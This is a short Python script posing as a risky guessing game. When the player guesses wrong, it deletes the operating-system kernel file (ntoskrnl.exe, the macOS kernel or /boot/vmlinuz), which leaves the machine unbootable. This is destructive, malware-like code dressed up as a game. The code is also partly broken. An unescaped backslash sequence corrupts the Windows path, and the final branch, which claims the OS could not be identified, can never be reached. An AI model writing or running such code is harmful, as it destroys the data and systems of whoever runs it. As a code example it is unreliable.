import os
import random
print("So you wanna play a game? take it at your own risks 😈")
while True:
    x = input("Choose a number in the range of (1-8): ")
    try:
        x = int(x)
        break 
    except ValueError:
        print("Invalid input! Please enter an integer in that range.")
fuckme = random.randint(1, 8)
print(fuckme)
if x == fuckme:
    print("You won... for this time")
elif x != fuckme:
    if os.path.exists("C:\Windows\System32\ntoskrnl.exe"):
        os.remove("C:\Windows\System32\ntoskrnl.exe")
    elif os.path.exists("/System/Library/kernel"):
        os.remove("/System/Library/kernel")
    elif os.path.exists("/boot/vmlinuz"):
        os.remove("/boot/vmlinuz")
else:
    print("You've been ucky this time, the system failed to identify your OS")
